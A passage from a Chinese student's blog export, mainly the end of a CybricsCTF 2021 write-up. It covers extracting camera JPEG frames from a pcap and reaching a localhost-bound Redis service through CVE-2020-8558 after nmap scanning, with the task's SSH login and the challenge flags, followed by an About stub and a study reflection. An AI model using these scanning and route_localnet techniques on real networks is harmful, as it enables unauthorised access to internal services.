如果直接使用上面的命令生成相应文件后用vim编辑器的%s/\\s/./g命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下\n最后flag：cybrics{T3553R4C7_15_GOOD}\n————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到录播视频中看\n参考：调皮捣蛋的Linux下有趣终端的合集 | Linux Fun - 如何在终端中创建ASCII文本横幅 | Neofetch - 显示具有分发标志的Linux系统信息\nLX-100 (Network, Easy, 192 pts)  Author: Vlad Roskov (@mrvos)\nWe were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.\nAnyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.\nlx100.pcap\n （说实话，pacp包是真的不会看TAT\n首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件 （以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是官方视频中确实这样可以成功 emmmm\ntshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data \u0026gt; hex.txt php -a foreach(file(\u0026quot;hex.txt\u0026quot;)as $i =\u0026gt; $ln) {file_put_contents(\u0026quot;frame$i.jpg\u0026quot;,hex2bin(trim($ln)));} （以下是在别的wp中看到的py脚本： 可成功复现 导出455张jpg图\nimport pyshark cap = pyshark.FileCapture(\u0026#39;lx100.pcap\u0026#39;) count = 0 for packet in cap: if \u0026#34;UDP\u0026#34; in packet and int(packet[\u0026#39;udp\u0026#39;].srcport) == 65415: count = count + 1 udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find(\u0026#39;ffd8ffdb\u0026#39;):]) file_out = open(\u0026#39;out_files/\u0026#39; + str(count) + \u0026#39;_packet.jpg\u0026#39;, \u0026#39;wb\u0026#39;) file_out.write(udp_bytes) 放大 再放大 每一根 最后的flag是 cybrics{Lost_Secrets_In_The_AIr}\nlocalhost (Network, Hard, 267 pts)  Author: Vlad Roskov (@mrvos)\nRemember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.\nssh localhost@109.233.61.10 Password: ohx7eeQu Your team token \u0026gt; Sw0T5cecsfJfaKApOiKzsA\n 先ssh连上看看情况（图中有一句命令输错了 应该是routes 留下了英语不好的泪水\n自带python2 python3 nmap，并且本身就是root身份，扫一下内网网段nmap -sS -Pn 10.193.10.7/24\n发现10.193.10.180的80端口开放，用curl访问\n提示Flag-containing-Records 接着访问两个超链接的内容\ncurl 10.193.10.180/redis.conf是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：\nbind 127.0.0.1 protected-mod yes port 6379 curl 10.193.10.180/sysctl.conf也是相关的配置文件 只有一句没被注释\nnet.ipv4.conf.all.route_localnet=1 查google，发现了这些：net.ipv4.conf.all.route_localnet=1 opens security issue #90259 | POC-2020-8558\n是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：\n In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the net.ipv4.conf.all.route_localnet=1 sysctl setting. According to the kernel documentation, this setting makes the kernel \u0026ldquo;not consider loopback addresses as martian\u0026rdquo; \u0026ndash; a consequence of which is that they could be accessed by other nodes on the network. That\u0026rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!\n\u0026hellip;\u0026hellip;\nA normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting net.ipv4.conf.all.route_localnet=1 changes that \u0026ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.\nSo, if an attacker has a local connection to a target node with net.ipv4.conf.all.route_localnet=1, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.\nNote that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker\u0026rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.\n （不得不说ipv4当初把整个127.0.0.0/8的地址都给了本地回环用真的是太慷慨了\u0026hellip;\u0026hellip; 到ipv6就只有一个:: 1\n在这里直接用poc打即可，关于test.py和poc.py这里也摘取一下说明\n tst-2020-8558.py Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to 127.0.0.1 via your target, and looks to see if there is a reply.\npoc-2020-8558.py Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default). Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal. Because this script uses raw sockets to send and receive the \u0026ldquo;localhost\u0026rdquo; packets, it works fine inside a normal unprivileged container.\n 因为需要nc 所以另开一个shell\n参考：wp | 为什么整个127.*网段都被拿来当做环回地址了？\n 本人比较菜，只做出来了签到题和几个web，其余均为赛后复盘，此处是参考wp\n道阻且长呀，暑假要好好努力咯 (つд⊂) 参照一些教程把简单的博客也搭起来了，以后要把这个小窝慢慢丰富起来(ゝ∀･)☆\n","date":"2021-07-29T17:02:12+08:00","permalink":"https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/","section":"posts","tags":["wp"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"好像还是空空如也qwq\n","date":"2021-07-27T14:37:22+08:00","permalink":"https://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":[],"contents":"你好呀！这里是葵子 这里应该有一个简略的个人介绍\n（详细的内容还得等我慢慢措辞 剩下部分留空了\n","date":"2021-07-27T14:28:14+08:00","permalink":"https://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"},{"categories":[],"contents":"时间飞逝，一眨眼进入大学已经快一年了，但时常觉得报道入校就在昨天。\n去年12月开始接触到ctf，0基础，每周末做一做ctfhub的技能树，当时对整个计算机世界算是完全小白 遇到一个名词就要查一查什么意思，经常是看个半天还是一知半解，做题也只能机械的重复一下搜到的wp里的步骤，有样学样。也就坚持了1个月，就开始复习期末考试→考试→放假，寒假算是在家里躺过去的，每天宅着看看剧 刷刷手机，碌碌无为的什么都不想干；临近开学了，才如梦初醒般的悔悟，看了两本书，捣鼓了下手机，浅浅地了解了一下安卓的刷机和搞机的相关知识。\n三月底正式开学，四月初开始把“荒废”的ctf题继续捡起来，从之前的每周末做做题变成了每天晚上都拿出时间来学习。当时虽然对安全还是懵懂的认识，但是我的直觉告诉我这就是我的爱好，是能带来成就感和快乐的东西，我愿意花时间去琢磨它。也是四月，看了《网络是怎样连接的》《图解http》和《图解tcp/ip》，正式的了解了一下计网（虽然也只是个入门）；做完ctfhub的web部分之后，也算是对ctf里web部分的基本类型都见过了，开始在buuoj上真正做一些ctf的题。\n然而到真正到做ctf题的时候发现自己又是那样的渺小，拿到一道题也只能抓包、扫目录，好一点的能拿到泄露的源码，可是到代码审计又是完全的稀烂，js不会看 php不会看 java更不会看，甚至连复杂一点的python也不会看，一个类型的题 稍微变个花样 拐个弯就又看不懂了，一副痛苦面具；现在回过头来看 很庆幸当时即使遇到了种种问题也没打退堂鼓，没见过的函数就去搜文档 看用法，没见过的知识点就去搜相关资料，看不懂的题就多看几个不同的wp 然后复现 用自己的话再整理出来 打好tag放到notion上。\n很快到了五月，五月初把老旧厚重的电脑换掉了，新上手的装备提升了不少学习的舒适感；这段时间也夹杂着做了一点burpsuite portswigger的题（这块做的不太扎实，而且当时做的时候没有用图床 笔记里的图片也都丢掉了 之后得回过头来重新看看），也夹杂做了几个单独类型的靶场；然后是两周难熬的军训。虽然军训难熬，但是过的真的很快乐。这里就是懂的都懂了，不详说。开心快乐的几个月，我将永远铭记。\n军训回来以后就六月了，算是进入正轨？不知道这样说是不是很合适，对很多题目也是一回生 二回熟，从一开始的完全不知道从哪里下手到稍微能分析一点（虽然还是不能脱离wp独自行走），可能对于一些有天赋的大佬来说这些轻轻松松，我可能花几个小时能搞懂的东西只需要别人一个小时能理解透，但是我已经很满意了，那句话怎么说？“进一寸有一寸的欢喜”，或许就是这样吧，虽然每天是笨拙地学着，但也开心。\n也是六月之后，开始关注漏洞、渗透、攻防等等安全方面核心向的一些东西，开始每天抽出时间看安全类的公众号文章，一开始只是不明觉厉——哇 虽然看不懂是在干什么 但是好nb 好厉害，看的多了一点以后开始慢慢明白那些高大上的名词是什么意思，原来网络安全的世界是那么让人着迷。也开始正式接触ctf比赛（虽然也就是进去签个到的水平……），开始做vulnhub的靶机，开始复盘之前做过的题，慢慢的 旁征博引 一点点的丰富知识体系。\n现在已经是7月中旬了，很快就要从大一的菜鸡变为大二的菜鸡了，回顾这一年的学习和生活也是感慨良多。满打满算，接触安全是不到四个月吧，算是也不短了，可是认真捋一下整个的过程 又是漏洞百出——代码审计能力稀烂，经常分析不出来问题所在的地方；逻辑链条一长的题目就思维呆滞 总是会下意识地想放弃 这真的不是个好现象；sqli和upload类的题做了不少，但还是不能自己独立的 完全不参考别人的wp完成一整个分析过程；对于python的掌握不够好，明显反应在任何需要编写py脚本的题目上；对一些知识点——不说一些了，可以说是全部的东西的了解和认识都还是浅尝辄止，停留在纸面上的花架子，比如反序列化 比如目录遍历，脑子里只能说有个残存的印象 可真正给我个这样的题 还是不能说轻松上手，甚至是对一些概念还理不清楚，学的东西可能看起来是有个样子 但我心里清楚 差的还太远太远，甚至完全没有到能自信的跟别人说“我在学ctf 我在学安全”的程度。\n学不动的时候经常会看大佬的博客，看看别人的学习经历是什么样的。之前还会拿年龄做自我开脱的借口，还小，还早，还都来得及，可是越学 越发现要去点亮的技能树越是枝繁叶茂，厚厚的树冠仿佛要遮天蔽日般——要学java 提高代码审计能力 常见的漏洞类型要做到心里有数，要把之前做过的题多温习 多想多练多看，要做到真正的掌握知识 而不是记住这个东西叫什么 徒有其表，要多写写代码 写代码的基本功太差那肯定是走不远，最感兴趣的渗透和漏洞方面的东西更要多看 可以本地复现的不要懒；即便如此，也有不少阳光能够穿透树叶交叠之处，温暖的洒落。可能我真的不是所谓的天赋型选手，只不过是万千平平无奇的普通人之一，学习能力也就是个中等水平，但是我相信量变引起质变，相信持之以恒的努力会带来改变，更何况这还是我非常喜欢的事情；可能我即使努力四年 也达不到那些大佬半年就能达到的高度，但是不重要 学习嘛 就是不会才要学，就算学不会也不是什么丢人的事情，日拱一卒，功不唐捐。\n再一抬眼，暑假就要来了。要干的和要学的很多，千头万绪的；但也算是有明确的方向，人还是忙起来好。下学期就大二了，再一晃就大三了，自己是不想考研的，但是到了大四 自己的实力够进大厂吗？会不会毕业即失业？我不知道，但谁又知道呢？未来的事情预测不了，能做的只有把握当下。\n大一就要结束了，在图书馆常坐的座位上，打开typora，草草的复盘了一下整个一学年。上一次写复盘总结还是六月初 刚军训完，一个有点迷茫的时候。如果跟0基础的自己比起来，可以说是成长了不少；但我知道这还远远达不到平均线，差的还太多，是完全拿不出手的程度。但总的来说，还算有一点点小小的收获，希望自己在之后的日子里也能坚守住初心，保持对安全的热爱，保持学习的热情，也保持对美好生活的热忱；希望能够变得越来越强大；希望大二的寒假写复盘总结的时候能有更多可写的 更多开心的事情。\n：）\n 之后的总结呀，一些随笔也都会放到小站上，不过一部分就不放到公开展示的posts上了，url就是/:year/:month/:day/:slug/的形式，算是变相的加密博客了叭？不过应该是家贼难防捏（\n","date":"2021-07-22T18:27:39+08:00","permalink":"https://amiaaaz.github.io/2021/07/22/0920-0721-summary/","section":"secrets","tags":[],"title":"一点小小的总结（"}]